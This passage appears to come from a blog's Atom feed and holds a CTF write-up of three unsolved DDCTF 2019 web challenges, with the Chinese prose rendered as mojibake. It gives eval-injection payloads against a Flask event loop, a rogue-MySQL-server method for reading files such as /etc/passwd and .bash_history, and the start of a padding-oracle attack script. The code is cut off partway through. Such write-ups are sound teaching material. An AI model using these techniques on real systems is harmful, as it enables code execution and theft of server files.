        &lt;p&gt;ä¸€å¹´ä¸€åº¦çš„RCTFå¼€å§‹äº†ï¼Œåˆèƒ½å­¦ä¸€æ³¢éªšæ“ä½œï¼ŒRCTFçš„webé¢˜ç›®å»å¹´å°±éå¸¸å¥½ï¼Œä»Šå¹´ä¹Ÿç‰¹åˆ«å‡ºè‰²ã€‚ç”±äºç ”ç©¶æ‰€æœˆèµ›çš„åŸå› æ²¡æœ‰å‚ä¸å…¶ä¸­ï¼Œæ‰€ä»¥èµ›åæ¥å¤ç°ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;h2 id=&quot;nextphp&quot;&gt;&lt;a href=&quot;#nextphp&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="CTF" scheme="https://hurricane618.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2019DDCTF æœªè§£å†³çš„webé¢˜ writeup</title>
    <link href="https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/"/>
    <id>https://hurricane618.me/2019/04/29/2019ddctf-unsolved-writeup/</id>
    <published>2019-04-29T06:52:54.000Z</published>
    <updated>2019-04-29T06:57:07.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>ä¸€é“pythonçš„ä»£ç å®¡è®¡é¢˜ç›®ï¼Œé¢˜ç›®çš„å…¥å£ç‚¹ä¼šæ£€æµ‹urlä¸­æºå¸¦çš„å‚æ•°å¹¶ä¸”åˆå§‹åŒ–sessionçš„å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">  querystring = urllib.unquote(request.query_string)</span><br><span class="line">  request.event_queue = []</span><br><span class="line">  <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">    querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">    session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">    session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">    session[<span class="string">'log'</span>] = []</span><br><span class="line">  request.prev_session = dict(session)</span><br><span class="line">  trigger_event(querystring)</span><br><span class="line">  <span class="keyword">return</span> execute_event_loop()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçœ‹åˆ°å¯¹æŸ¥è¯¢å‚æ•°æœ‰è½¬ä¹‰ï¼ŒåŒæ—¶æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œæ¯”å¦‚å¼€å¤´å¿…é¡»ä¸º<code>action:</code>ï¼ŒåŒæ—¶é•¿åº¦ä¸èƒ½è¶…è¿‡100ã€‚</p><p>åœ¨è¿›å…¥å¤„ç†äº‹ä»¶å¾ªç¯ä¹‹å‰ä¼šå…ˆå°†æŸ¥è¯¢å‚æ•°æ·»åŠ è¿›äº‹ä»¶è®°å½•ä¸­ã€‚è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¼šå¯¹<code>event</code>åšåˆ¤æ–­ï¼Œæ‰€ä»¥å®ƒæ—¢å¯ä»¥ä¼ æ•°åˆ—ä¹Ÿå¯ä»¥æ˜¯å•ä¸ªå€¼ï¼Œè¿™é‡Œæ˜¯è¿™é“é¢˜ç›®çš„å…³é”®ç‚¹ä¹‹ä¸€ï¼Œå®ƒçš„å‚æ•°æ˜¯å¯ä»¥ä¼ æ•°åˆ—çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">  session[<span class="string">'log'</span>].append(event)</span><br><span class="line">  <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line">  <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">    request.event_queue += event</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    request.event_queue.append(event)</span><br></pre></td></tr></table></figure><p>è¿™ä¹‹åå°±ä¼šè¿›å…¥äº‹ä»¶å¤„ç†å¾ªç¯ä¸­ï¼Œæœ€å…³é”®çš„ä¸€ç‚¹æ˜¯é’ˆå¯¹äº‹ä»¶çš„å¤„ç†ï¼Œä»äº‹ä»¶é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªï¼Œéšåä¼šåˆ¤æ–­æ˜¯å¦ä¸º<code>action</code>ï¼Œå°†<code>:</code>å’Œ<code>;</code>ä¹‹é—´çš„å­—ç¬¦ä¸²å½“ä½œå‡½æ•°åŠ¨ä½œåï¼Œå¹¶ä¸”æŠŠå‰©ä¸‹çš„å­—ç¬¦ä¸²ç”¨<code>#</code>åˆ‡åˆ†å½“ä½œå‚æ•°ã€‚å‡½æ•°åŠ¨ä½œæ‹¼æ¥åç¼€å­—ç¬¦ä¸²ä¹‹åç”¨<code>eval</code>æ‰§è¡Œæˆä¸ºç›¸åº”çš„å‡½æ•°ï¼Œæœ€åå‡½æ•°å¸¦å…¥å‚æ•°æ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">    ...</span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>å¤§è‡´çš„æµç¨‹å°±æ˜¯è¿™æ ·ï¼Œè¿™é‡Œé¢˜ç›®çš„å…³é”®ç‚¹æ˜¯ä¸‹é¢çš„<code>getflag</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å½“sessionä¸­çš„æ•°é‡å¤§äº5çš„æ—¶å€™ä¼šå°†flagæ·»åŠ è¿›äº‹ä»¶è®°å½•ä¸­ï¼ŒåŒæ—¶äº‹ä»¶é˜Ÿåˆ—ä¹Ÿä¼šæ·»åŠ è¿™ä¸ªä»»åŠ¡ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">  flag = args[<span class="number">0</span>]</span><br><span class="line">  <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">  <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">    trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">  trigger_event(<span class="string">'action:view;index'</span>)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯èµ·å§‹çš„ç‚¹æ•°ä¸º3ï¼Œæˆ‘ä»¬æ€ä¹ˆæ‰èƒ½è·å¾—5ä¸ªé’»çŸ³ï¼Ÿè¿™å°±è¦åˆ†æè´­ä¹°é’»çŸ³çš„æ“ä½œæµç¨‹äº†ï¼Œè¿™é‡Œçš„è´­ä¹°æ“ä½œä¼šå…ˆå¢åŠ é’»çŸ³æ•°é‡ï¼Œç„¶åå°†æ¶ˆè´¹æ“ä½œåŠ å…¥äº‹ä»¶é˜Ÿåˆ—ä¸­ï¼Œè¿™å°±æ˜¯è¯´è´­ä¹°å’Œæ¶ˆè´¹æ˜¯åˆ†å¼€çš„å¹¶ä¸æ˜¯åŸå­æ“ä½œã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è´­ä¹°å¤šä¸ªé’»çŸ³ï¼Œåœ¨æ¶ˆè´¹æ“ä½œä¹‹å‰æ‰§è¡Œ<code>getflag</code>å‡½æ•°å°±èƒ½æŠŠflagå­˜å…¥äº‹ä»¶é˜Ÿåˆ—ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">  num_items = int(args[<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">  session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">  trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">  point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">  <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">  session[<span class="string">'points'</span>] -= point_to_consume</span><br></pre></td></tr></table></figure><p>å¥½äº†ï¼Œæˆ‘å½“æ—¶å°±å¡åœ¨è¿™é‡Œï¼Œä¸çŸ¥é“è¯¥æ€ä¹ˆèµ°ä¸‹å»ã€‚å› ä¸ºè¿™é‡Œå¦‚æœæŒ‰ç…§å¸¸è§„æ“ä½œåªèƒ½ä¸€æ¬¡æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œå¹¶ä¸èƒ½ä¸€æ¬¡æ€§å¤šæ¬¡è´­ä¹°ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜ï¼›ç¬¬äºŒï¼Œå°±ç®—å¤šæ¬¡è´­ä¹°ä¹‹åæ‰§è¡Œ<code>getflag</code>æˆ‘ä»¬ä¹Ÿä»…ä»…æ˜¯æŠŠflagæ”¾è¿›äº†äº‹ä»¶é˜Ÿåˆ—ä¸­ï¼Œè€Œæ¯ä¸ªäº‹ä»¶æ˜¯ç‹¬ç«‹çš„æ²¡æœ‰åŠæ³•è·å–å‰é¢äº‹ä»¶çš„å‚æ•°ã€‚</p><p>é’ˆå¯¹ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•ä¸€æ¬¡æ€§å¤šæ¬¡è´­ä¹°ï¼Œè¿™é‡Œå°±è¦è§‚å¯Ÿä»£ç ä¸­å®ƒæ˜¯å¦‚ä½•å¤šæ¬¡æ‰§è¡Œçš„ï¼Œ<code>trigger_event([&#39;func:consume_point;{}&#39;.format(num_items), &#39;action:view;index&#39;])</code>ï¼Œä½¿ç”¨äº†<code>trigger_event</code>ä¼ å…¥æ•°åˆ—ï¼Œå…¶ä¸­æ•°åˆ—å°±æ˜¯å¤šä¸ªæ“ä½œçš„é›†åˆï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¹Ÿçœ‹çœ‹èƒ½ä¸èƒ½è°ƒç”¨<code>trigger_event</code>ã€‚è¿™é‡Œç”¨åˆ°äº†ä¸€ä¸ªä½œè€…è®¾è®¡ä¸Šçš„é—®é¢˜ï¼Œå¦‚æœ<code>action</code>ä¸­åŒ…å«<code>#</code>ï¼Œæ°å¥½è¿™ä¸ªç¬¦å·æ˜¯pythonä¸­çš„æ³¨é‡Šç¬¦å·ï¼Œé‚£ä¹ˆè¿™ä¸ªè¯­å¥ä¸­<code>eval(action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))</code>é‚£ä¸ª<code>#</code>å°±å¯ä»¥æˆªæ–­åé¢çš„åç¼€ï¼Œè¿™é‡Œçš„actionå°±æ˜¯ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>æˆ‘ä»¬çš„payloadï¼š<code>action:trigger_event%23;action:xxx;arg1%23action:xxx;arg2%23</code>ï¼Œè¿™æ ·åé¢çš„å‚æ•°éƒ¨åˆ†è·Ÿç€æƒ³è¦è°ƒç”¨çš„å‡½æ•°å°±å¯ä»¥è¢«<code>trigger_event</code>åŠ è¿›äº‹ä»¶é˜Ÿåˆ—ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¸€æ¬¡æ€§å¤šæ¬¡è´­ä¹°äº†ï¼ŒåŒæ—¶è°ƒç”¨<code>getflag</code>å°±èƒ½æ·»åŠ flagè¿›äº‹ä»¶é˜Ÿåˆ—ä¸­ã€‚payloadï¼š<code>action:trigger_event%23;action:buy;1%23action:buy;1%23action:get_flag;1</code>ã€‚</p><p>é’ˆå¯¹ç¬¬äºŒä¸ªé—®é¢˜ï¼Œflagå·²ç»è¿›å…¥åˆ°äº‹ä»¶é˜Ÿåˆ—ä¸­äº†ï¼Œæ€ä¹ˆæŸ¥çœ‹ï¼Ÿè¿™å°±æ¶‰åŠåˆ°flaskçš„sessionè®¾è®¡äº†ï¼Œä¹‹å‰phç‰›è®²è¿‡è¿™ç±»sessionæ˜¯å’Œjwtç±»ä¼¼çš„åŸç†ã€‚é‡Œé¢çš„ä¸œè¥¿æ˜¯å¯ä»¥è¢«è§£å¯†çš„ï¼Œä¸èƒ½å­˜æ”¾ç”¨æˆ·å‡­è¯æˆ–è€…å…¶ä»–ä¸€äº›æœºå¯†æ•°æ®ã€‚<code>session[&#39;log&#39;].append(event)</code>ï¼Œè¿™é‡Œsessionä¼šè®°å½•äº‹ä»¶ï¼Œæ‰€ä»¥flagæœ€åä¹Ÿä¼šè¢«è®°å½•åœ¨é‡Œé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦è°ƒç”¨<code>get_flag</code>ä¹‹åï¼Œæˆ‘ä»¬çš„sessionä¸­å°±ä¼šæœ‰ç›¸å…³è®°å½•ï¼Œæœ€ååªéœ€è¦è§£å¯†å°±å¯ä»¥æ‹¿åˆ°flagã€‚</p><p>åœ¨æœ¬åœ°æ“ä½œå¯ä»¥çœ‹åˆ°æ‹¿åˆ°äº†æµ‹è¯•ç”¨çš„flagã€‚</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/1.png"><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ç”±äºæŸ¥è¯¢å­—ç¬¦ä¸²ä¼šè¢«é™åˆ¶åœ¨é•¿åº¦100ä»¥å†…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆæ­£å¸¸è´­ä¹°ä¸‰ä¸ªé’»çŸ³ï¼Œç„¶åå†ä½¿ç”¨ä¸Šé¢çš„æ–¹æ³•ä¸€æ¬¡æ€§å†è´­ä¹°ä¸¤ä¸ªï¼Œä¹‹åé©¬ä¸Šè°ƒç”¨<code>get_flag</code>ã€‚è¿™æœ€åçš„è§£å¯†æ˜¯ä½¿ç”¨<a href="https://github.com/Paradoxis/Flask-Unsign" target="_blank" rel="noopener">https://github.com/Paradoxis/Flask-Unsign</a></p><p>è™½ç„¶æœ€åä¼šå‡ºç°æŠ¥é”™ï¼Œå¦‚ä¸‹å›¾ï¼š</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/2.png"><p>ä½†æ˜¯ï¼Œflagå·²ç»å†™è¿›äº†sessionä¸­ï¼Œå¹¶ä¸”æ²¡æœ‰åˆ é™¤ï¼Œè¿™å°±æ˜¯å…³é”®ç‚¹ã€‚</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/3.png"><p>è§£å¯†æ•°æ®æ‹¿åˆ°flagã€‚</p><h2 id="mysqlå¼±å£ä»¤"><a href="#mysqlå¼±å£ä»¤" class="headerlink" title="mysqlå¼±å£ä»¤"></a>mysqlå¼±å£ä»¤</h2><p>ä»ç½‘ç«™é¡µé¢çœ‹æ¥æ˜¯ä¸€ä¸ªç±»ä¼¼<code>hydra</code>çš„æ‰«æç½‘ç«™ï¼Œå®ƒä¼šå»è¿æ¥æˆ‘ä»¬æä¾›çš„IPå’Œç«¯å£ã€‚è¿™é‡Œå…¶å®æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œåœ¨ä¹‹å‰æ¯”èµ›é‡åˆ°çš„MySQL clientè¯»å–çš„æ¼æ´æœ‰å…³ï¼ŒåŒæ ·æ˜¯ç½‘ç«™æ‹…å½“å®¢æˆ·ç«¯å»è¯·æ±‚MySQLæœåŠ¡ç«¯ã€‚</p><p>å¦‚æœæ­£å¸¸çš„å»æ‰«æçš„è¯ç»“æœå¦‚ä¸‹ï¼š</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/4.png"><p>ä½¿ç”¨<code>tcpdump</code>æŠ“åŒ…çš„ç»“æœæ˜¯æ˜¾ç¤ºæ²¡æœ‰æƒé™å»è®¿é—®ã€‚ã€‚ã€‚è€Œä¸”ç”±äºæœåŠ¡ç«¯å¼€å¯äº†SSLåŠ å¯†ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½å¼€åˆ°æ‰€æœ‰æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/5.png"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER &apos;root&apos;@&apos;117.51.147.155&apos; IDENTIFIED BY &apos;&apos;;</span><br><span class="line">grant all privileges on *.* to &apos;root&apos;@&apos;117.51.147.155&apos; IDENTIFIED BY &apos;&apos; with grant option;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åˆ›å»ºä¸€ä¸ªæˆæƒçš„ç”¨æˆ·ä¹‹åï¼Œå†æ¬¡æŠ“åŒ…æ¥è§‚å¯Ÿæ•°æ®æƒ…å†µã€‚</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/6.png"><img src="/2019/04/29/2019ddctf-unsolved-writeup/7.png"><p>å®ƒä¼šä»¥ç”¨æˆ·åä¸ºrootï¼Œå¯†ç ä¸ºç©ºçš„è¯·æ±‚æ¥è®¿é—®æˆ‘ä»¬çš„MySQLæœåŠ¡ç«¯ã€‚é‚£ä¹ˆä»MySQLå®˜æ–¹æ–‡æ¡£ä¸­æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ï¼Œ<code>A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL</code>ï¼Œä¸ä»…ä»…æ˜¯åœ¨è¯»æ–‡ä»¶æ“ä½œå¯ä»¥è·å–æœ¬åœ°æ–‡ä»¶ï¼Œå…¶ä»–æ“ä½œä¾æ—§å¯ä»¥ï¼Œä½†æ˜¯å®¢æˆ·ç«¯å¿…é¡»è¦å¼€å¯åŠ è½½æœ¬åœ°æ–‡ä»¶çš„é€‰é¡¹ã€‚</p><p><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/</a>ä»è¿™ç¯‡åšæ–‡ä¸­æˆ‘ä»¬è·å¾—ä¸€ä¸ªæ¶æ„MySQLçš„è„šæœ¬ï¼Œä¸ºäº†è®©å®¢æˆ·ç«¯å‘å‡ºæŸ¥è¯¢çš„æ“ä½œï¼š</p><ol><li>æœåŠ¡ç«¯éœ€è¦å‘é€<code>Server Greeting</code></li><li>ç­‰å¾…å®¢æˆ·ç«¯å›å¤<code>Query Package</code></li><li>å‘é€<code>file transfer</code>è¯·æ±‚</li></ol><p>å½“ç„¶è¿™äº›æ ¼å¼åœ¨å®˜æ–¹æ–‡æ¡£ä¸­éƒ½æœ‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æŠ“åŒ…ç¡®è®¤ã€‚</p><p><a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake" target="_blank" rel="noopener">MySQLæ¡æ‰‹åŒ…</a>ï¼Œ<a href="https://dev.mysql.com/doc/internals/en/com-query-response.html" target="_blank" rel="noopener">æ–‡ä»¶ä¼ è¾“åŒ…</a></p><p>ç„¶åpyè„šæœ¬å¼€å§‹ï¼ç‚¹å‡»æ‰«æï¼ç„¶åï¼š</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/8.png"><p>emmmmï¼Ÿï¼Ÿï¼Ÿè¿™æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿéšåä»”ç»†çœ‹äº†çœ‹é¢˜ç›®ç»™çš„<code>agent.py</code>å’ŒæŠ“åŒ…ä¸­çš„å¥‡æ€ªhttpè¯·æ±‚ï¼Œæ‰å‘ç°åŸæ¥è¿™ä¸ªä»£ç†æ˜¯ç”¨æ¥æ£€æµ‹æœåŠ¡å™¨ä¸Šè¿è¡Œçš„è¿›ç¨‹çš„ã€‚</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/9.png"><p>é‚£ä¹ˆè¿™æ ·å°±åªèƒ½åœ¨è¿”å›çš„æ•°æ®åŒ…ä¸­æ‰‹åŠ¨æ·»åŠ <code>mysqld</code>ï¼Œæ¥è®©å®¢æˆ·ç«¯è®¤ä¸ºæœåŠ¡ç«¯æ˜¯å¼€å¯çŠ¶æ€ã€‚</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/10.png"><p>æµ‹è¯•æˆåŠŸï¼Œè¯»å–åˆ°äº†<code>/etc/passwd</code>çš„æ•°æ®ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ‰¾flagçš„è¿‡ç¨‹äº†ã€‚è¿™é‡Œæ˜¯ç›´æ¥è¯»å–<code>.bash_history</code>ï¼Œshellçš„å†å²è®°å½•æ¥å›æº¯å‡ºé¢˜äººçš„æ“ä½œè¿‡ç¨‹ï¼Œå‘ç°æœ€åçš„<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>ã€‚</p><p>åœ¨æ–‡ä»¶ä¸­æœ‰ä¸€æ¡æ³¨é‡Š<code># flag in mysql  curl@localhost database:security  table:flag</code>ï¼Œè¿™å°±çŸ¥é“äº†flagåœ¨æ•°æ®åº“ä¸­ï¼Œè¿™é‡Œç›´æ¥è¯»æ•°æ®åº“æ–‡ä»¶å°±å¯ä»¥äº†ï¼Œæ ¹æ®mysqlçš„æ•°æ®åº“å­˜å‚¨è§„åˆ™<code>/var/lib/mysql/database/table.idb</code>ï¼Œè¯»å–æ–‡ä»¶<code>/var/lib/mysql/security/flag.idb</code>ã€‚</p><p>å‘ç‚¹ï¼šåœ¨å¯åŠ¨ä¼ªè£…mysqlçš„æ—¶å€™ï¼Œå¯èƒ½ä¸€å¼€å§‹æ‰«æä¼šæœ‰äº›é—®é¢˜ï¼Œæœ‰å¯èƒ½æ˜¯ç«¯å£é‡Šæ”¾éœ€è¦ä¸€å®šçš„æ—¶é—´ã€‚æ‰€ä»¥å¦‚æœä¸€æ¬¡ä¸è¡Œï¼Œå°±è¦å¤šæ‰«å‡ æ¬¡ã€‚</p><p>å°æŠ€å·§ï¼šæ€ä¹ˆå¤„ç†è¿™ä¹ˆå¤§ä¸€å †å­—ç¬¦ä¸²ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´ï¼Œåœ¨pythonä¸­printä¸€ä¸‹å°±å®Œäº‹ã€‚ç®€å•ç²—æš´ï¼Œä¸ç”¨å†™è„šæœ¬ï¼Œä¸ç”¨æ‰‹åŠ¨æ’ç‰ˆã€‚</p><h2 id="å†æ¥ä¸€æ¯Java"><a href="#å†æ¥ä¸€æ¯Java" class="headerlink" title="å†æ¥ä¸€æ¯Java"></a>å†æ¥ä¸€æ¯Java</h2><p>æ ¹æ®é¢˜ç›®çš„è¦æ±‚æ†ç»‘hostsï¼Œè®¿é—®é“¾æ¥ä¹‹åï¼Œåœ¨cookieä¸­å‘ç°tokenã€‚base64è§£ç ä¹‹åå‘ç°æœ‰hintï¼Œ<code>PadOracle,cbc</code>ã€‚</p><img src="/2019/04/29/2019ddctf-unsolved-writeup/11.png"><p>åœ¨è¿™ä¹‹åå°±æ˜¯é’ˆå¯¹cookieåš<code>padding oracle</code>å’Œ<code>cbcç¿»è½¬</code>æ”»å‡»ã€‚å› ä¸ºå»é™¤é¦–éƒ¨çš„æè¿°å­—ç¬¦çš„16ä½ä¸ºIVï¼Œå‰©ä¸‹çš„æ˜¯æ¨æµ‹çš„16ä½å­—ç¬¦ä¸ºä¸€ç»„çš„å¯†æ–‡ï¼Œé‚£ä¹ˆè¿™æ ·çš„è¯å°±æ˜¯16ä½å­—ç¬¦ä¸²ä¸ºä¸€ä¸ªåŒºå—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(a[i]) ^ ord(b[i % len(b)])) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(a))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding_oracle</span><span class="params">(ciper_hex, N)</span>:</span></span><br><span class="line">    get = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="comment"># print(i,j)</span></span><br><span class="line">            padding = xor(get, chr(i) * (i - <span class="number">1</span>))</span><br><span class="line">            c = chr(<span class="number">0</span>) * (N - i) + chr(j) + padding</span><br><span class="line">            payload=<span class="string">'5061644f7261636c653a69762f636263'</span>+c.encode(<span class="string">'hex'</span>)+ciper_hex</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            get_api_return=get_api(payload)</span><br><span class="line">            <span class="comment"># print(get_api_return)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"decrypt err~"</span> <span class="keyword">not</span> <span class="keyword">in</span> get_api_return:</span><br><span class="line">                get = chr(j ^ i) + get</span><br><span class="line">                print(get.encode(<span class="string">'hex'</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> get.encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(strings)</span>:</span></span><br><span class="line">    padding_len=<span class="number">8</span>-len(strings)%<span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> strings+chr(padding_len)*padding_len</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 